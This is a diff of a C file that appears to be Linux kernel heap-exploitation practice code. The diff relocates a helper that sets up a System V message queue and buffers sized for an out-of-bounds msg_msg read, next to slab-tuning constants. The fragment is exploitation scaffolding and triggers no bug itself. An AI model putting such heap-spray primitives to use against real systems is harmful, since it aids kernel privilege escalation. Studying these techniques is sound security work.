@@ -37,59 +37,6 @@
 #define STR_EXPAND(arg) #arg
 #define STR(arg) STR_EXPAND(arg)
 
-#define MSG_NORM_SIZE	DRILL_ITEM_SIZE - 48
-#define MSG_NORM_TYPE	5
-#define MSG_OOB_SIZE	0x2000
-#define BUF_OOB_SIZE	MSG_OOB_SIZE + 0x100
-#define MSG_OOB_TYPE	0xc001
-
-unsigned long *msgrcv_buf = NULL;
-int msqid = -1;
-
-struct {
-	long mtype;
-	char mtext[MSG_NORM_SIZE];
-} msg_oob_r;
-
-int prepare_msg_msg(void)
-{
-	int for_ftok_fd = -1;
-	key_t key;
-
-	msgrcv_buf = malloc(BUF_OOB_SIZE);
-	if (msgrcv_buf == NULL) {
-		perror("[-] malloc");
-		return 1;
-	}
-	memset(msgrcv_buf, 0, BUF_OOB_SIZE);
-
-	for_ftok_fd = open("forftok1", O_CREAT, S_IRUSR | S_IWUSR);
-	if (for_ftok_fd < 0) {
-		perror("[-] open for ftok");
-		return 1;
-	}
-	close(for_ftok_fd);
-
-	key = ftok("forftok1", 1);
-	if (key == -1) {
-		perror("[-] ftok");
-		return 1;
-	}
-
-	msqid = msgget(key, IPC_CREAT | 0666);
-	if (msqid == -1) {
-		perror("[-] msgget");
-		return 1;
-	}
-
-	printf("[+] created msqid %d\n", msqid);
-
-	memset(msg_oob_r.mtext, 0x42, MSG_NORM_SIZE);
-	msg_oob_r.mtype = MSG_NORM_TYPE;
-
-	return 0;
-}
-
 void do_cpu_pinning(void)
 {
 	int ret = 0;
@@ -182,6 +129,59 @@ int act(int fd, int code, int n, char *args)
  */
 #define OBJS_PER_SLAB 42
 #define CPU_PARTIAL 120
+
+#define MSG_NORM_SIZE	DRILL_ITEM_SIZE - 48
+#define MSG_NORM_TYPE	5
+#define MSG_OOB_SIZE	0x2000
+#define BUF_OOB_SIZE	MSG_OOB_SIZE + 0x100
+#define MSG_OOB_TYPE	0xc001
+
+unsigned long *msgrcv_buf = NULL;
+int msqid = -1;
+
+struct {
+	long mtype;
+	char mtext[MSG_NORM_SIZE];
+} msg_oob_r;
+
+int prepare_msg_msg(void)
+{
+	int for_ftok_fd = -1;
+	key_t key;
+
+	msgrcv_buf = malloc(BUF_OOB_SIZE);
+	if (msgrcv_buf == NULL) {
+		perror("[-] malloc");
+		return 1;
+	}
+	memset(msgrcv_buf, 0, BUF_OOB_SIZE);
+
+	for_ftok_fd = open("forftok1", O_CREAT, S_IRUSR | S_IWUSR);
+	if (for_ftok_fd < 0) {
+		perror("[-] open for ftok");
+		return 1;
+	}
+	close(for_ftok_fd);
+
+	key = ftok("forftok1", 1);
+	if (key == -1) {
+		perror("[-] ftok");
+		return 1;
+	}
+
+	msqid = msgget(key, IPC_CREAT | 0666);
+	if (msqid == -1) {
+		perror("[-] msgget");
+		return 1;
+	}
+
+	printf("[+] created msqid %d\n", msqid);
+
+	memset(msg_oob_r.mtext, 0x42, MSG_NORM_SIZE);
+	msg_oob_r.mtype = MSG_NORM_TYPE;
+
+	return 0;
+}
 
 int main(void)
 {
